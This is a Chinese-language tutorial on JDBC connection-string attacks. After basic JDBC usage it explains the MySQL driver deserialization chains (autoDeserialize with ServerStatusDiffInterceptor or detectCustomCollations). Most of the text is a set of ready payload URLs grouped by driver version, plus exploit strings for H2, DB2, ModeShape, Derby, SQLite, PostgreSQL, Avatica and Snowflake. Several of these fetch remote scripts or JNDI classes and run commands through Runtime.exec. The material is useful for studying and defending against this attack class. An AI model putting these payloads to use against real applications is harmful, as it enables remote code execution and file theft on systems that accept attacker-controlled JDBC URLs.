# JDBC 攻击

- [JDBC 应用](#jdbc应用)

- [JDBC 攻击-mysql](#jdbc攻击-mysql)

  - [ServerStatusDiffInterceptor 调用链](#serverstatusdiffinterceptor调用链)
  - [detectCustomCollations 调用链](#detectcustomcollations调用链)
  - [payload](#payload)

- [JDBC 攻击-其他数据库](#jdbc攻击-其他数据库)

  - [H2](#h2)
  - [DB2](#db2)
  - [ModeShape](#modeshape)
  - [Apache Derby](#apache-derby)
  - [SQLite](#sqlite)
  - [PostgreSQL](#postgresql)
  - [Apache Calcite Avatica](#apache-calcite-avatica)
  - [Snowflake](#snowflake)

- [JDBC 攻击-文件读取](#jdbc攻击-文件读取)

JDBC（Java DataBase Connectivity），是 Java 程序访问数据库的标准接口。常用的关系数据库包括：付费的（`Oracle、SQL Server、DB2、Sybase`）、开源的（`MySQL、PostgreSQL、Sqlite`）。JDBC 接口通过 JDBC 驱动来访问数据库，而 JDBC 驱动由各个数据库厂商提供，也就是不同的数据库对应有各自的驱动。使用 JDBC 的好处就是不需要根据不同的数据库做开发，拥有统一的接口。

## JDBC 应用

假如使用 MySQL 的 JDBC 驱动，只需要在 maven 中引入对应的 jar 包。scope 设置为 runtime，因为编译时并不需要此 jar 包，只在运行期使用。

```
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>5.1.47</version>
    <scope>runtime</scope>
</dependency>
```

使用 jdbc 连接 mysql 中 student 数据库（mysql 驱动后面跟的可选扩展参数包括`loadDataLocal、requireSSL、socksProxyHost、useAsyncProtocol、useServerPrepStmts、allowUrlInLoadLocal`等）

```java
String JDBC_URL = "jdbc:mysql://localhost:3306/student?requireSSL=false";
String JDBC_USER = "root";
String JDBC_PASSWORD = "password";
try (Connection conn = DriverManager.getConnection(JDBC_URL, JDBC_USER, JDBC_PASSWORD)) { // 获取数据库连接
    try (Statement stmt = conn.createStatement()) {
        try (ResultSet rs = stmt.executeQuery("SELECT id, name FROM students WHERE id=1")) {
            while (rs.next()) { // 获取列数据
                int id = rs.getInt(1); // ResultSet 索引从1开始，而不是0
                String name = rs.getString(2);
            }
        }
    }
}
conn.close();
```

`Statement`容易引发 SQL 注入，想要完全避免 SQL 注入可以使用`PreparedStatement`，使用占位符的方式。

```java
try (Connection conn = DriverManager.getConnection(JDBC_URL, JDBC_USER, JDBC_PASSWORD)) {
    try (PreparedStatement ps = conn.prepareStatement("SELECT id, name FROM students WHERE id=?")) {
        ps.setObject(1, id);
        try (ResultSet rs = ps.executeQuery()) {
            while (rs.next()) {
                int id = rs.getInt("id");
                String name = rs.getString("name");
            }
        }
    }
}
```

## jdbc 攻击-mysql

上面提到 mysql 驱动的 URL 可选扩展参数有很多，其中一个叫做`autoDeserialize`，如果配置为 true，客户端会自动反序列化服务端返回的数据。mysql-connector-java.jar 中的类`com/mysql/cj/jdbc/result/ResultSetImpl.class#getObject()`方法如下。如果 autoDeserialize 属性值为 true，就会进行反序列化操作。

```java
byte[] data = this.getBytes(columnIndex);
if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) {
    return data;
} else {
    Object obj = data;
    if (data != null && data.length >= 2) {
        ...
        try {
            ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
            ObjectInputStream objIn = new ObjectInputStream(bytesIn);
            obj = objIn.readObject();
            objIn.close();
            bytesIn.close();
        }
}
```

但是默认情况下客户端不会调用 getObject()方法。就像找反序列化调用链一样需要找到上层的调用。

### ServerStatusDiffInterceptor 调用链

<https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf这篇给出的链条如下>

```
com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#postProcess/preProcess()
  com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()
    ResultSetUtil#resultSetToMap()
```

最终走到的 resultSetToMap 方法如下，调用了 getObject()方法

```java
public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException {
    while (rs.next()) {
        mappedValues.put(rs.getObject(1), rs.getObject(2));
    }
}
```

`ServerStatusDiffInterceptor`实现自 QueryInterceptor 接口，它对应扩展参数 queryInterceptors。那么就可以构造一个恶意的 JDBC URI 来触发反序列化。

```
jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

### detectCustomCollations 调用链

这条链最终也是走到 resultSetToMap 方法，核心是`com.mysql.jdbc.ConnectionImpl#buildCollationMapping()`方法，如果满足版本大于 4.1.0 并且 detectCustomCollations 值为 true，就会调用到 resultSetToMap 方法，最终进行反序列化操作。

```java
if (this.versionMeetsMinimum(4, 1, 0) && this.getDetectCustomCollations()) { // 版本大于4.1.0，detectCustomCollations值为true
    java.sql.Statement stmt = null;
    ResultSet results = null;

    try {
        sortedCollationMap = new TreeMap();
        customCharset = new HashMap();
        customMblen = new HashMap();
        stmt = this.getMetadataSafeStatement();

        try {
            results = stmt.executeQuery("SHOW COLLATION");
            if (this.versionMeetsMinimum(5, 0, 0)) {
                Util.resultSetToMap(sortedCollationMap, results, 3, 2); // 调用resultSetToMap()
        }...
}
```

因为是服务端攻击客户端，还需要一个恶意的 mysql 服务端。这部分可以用工具: <https://github.com/fnmsd/MySQL_Fake_Server>

恶意 mysql 服务器的核心思路是将反序列化数据存储在对应的数据表中对应字段中。以 detectCustomCollations 调用链为例`Util.resultSetToMap(sortedCollationMap, results, 3, 2);`会对第三个字段进行获取，那么就需要创建一张表，列出至少三个字段，并将 `ysoserial` 生成的反序列化数据赋值给第三个字段。

### Payload 总结

#### `ServerStatusDiffInterceptor` 触发

##### 8.x

```java
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

##### 6.x

属性名不同，变更为 `statementInterceptors`

```java
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

##### 5.1.11 - 5.x

```java
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
```

> `5.1.10` 及以下的 `5.1.X` 版本：同上，但是需要连接后执行查询。

另外由于不同版本 jdbc 扩展参数可能存在差异，工具中也给出了不同版本下的利用 URI

Ps: 如果是读文件需要加 maxAllowedPacket=655360

##### 5.0.x

没有 `ServerStatusDiffInterceptor`，不可利用。

#### `detectCustomCollations` 触发

##### 5.1.41 - 5.1.x

不可用

##### 5.1.29 - 5.1.40

```java
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true
```

##### 5.1.19 - 5.1.28

```
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true
```

##### 5.1.x - 5.1.18

不可用

##### 5.0.x

不可用

## JDBC 攻击-其他数据库

### H2

```
# 远程拉取sql脚本
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8089/poc.sql'

poc.sql: CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "run";}';CALL EXEC ('open -a Calculator.app')

# 多语句
jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"trganda\"\\;}'\\;CALL EXEC ('open -a Calculator.app')

# Groovy
jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'"

String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")" + "})" + "def x";

# Javascript
jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test1 BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")'"

# Ruby
jdbc:h2:mem:db;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE SCHEMA IF NOT EXISTS db\\;CREATE TABLE db.TEST(ID INT PRIMARY KEY, NAME VARCHAR(255))\\;CREATE TRIGGER POC BEFORE SELECT ON db.TEST AS '#ruby\nrequire \"java\"\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")'
```

### DB2

```
jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evilClass;
```

### ModeShape

```
jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass
```

### Apache Derby

```
jdbc:derby:db;startMaster=true;slaveHost=127.0.0.1
```

在 `127.0.0.1` 启动恶意 slave 服务。

### SqLite

文件上传 + 利用拓展实现命令执行

```
jdbc:sqlite::resource:http://127.0.0.1:8001/poc.db
```

### PostgreSQL

```
# Sslfactory & Sslfactoryarg
jdbc:postgresql://localhost/test?sslfactory=org.springframework.context.support.ClassPathXmlApplicationContext&sslfactoryarg=ftp://127.0.0.1:2121/bean.xml

# socketFactory & socketFactoryArg
jdbc:postgresql://localhost/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=ftp://127.0.0.1:2121/bean.xml
```

### Apache Calcite Avatica

SSRF

```
jdbc:avatica:remote:url=https://jdbc-attack.com?file=/etc/passwd;httpclient_impl=sun.security.provider.PolicyFile
```

### Snowflake

```
jdbc:snowflake://jdbc-attack.com/?user=trganda&passwd=trganda&db=db&authenticator=externalbrowserP
```

> 以上 Poc 可参考 https://github.com/trganda/atkjdbc

## jdbc 攻击-文件读取

这篇文章已经说的很全了，漏洞定位`com.mysql.jdbc.MysqlIO#sendFileToServer`
<https://lorexxar.cn/2020/01/14/css-mysql-chain/#Load-data-infile>
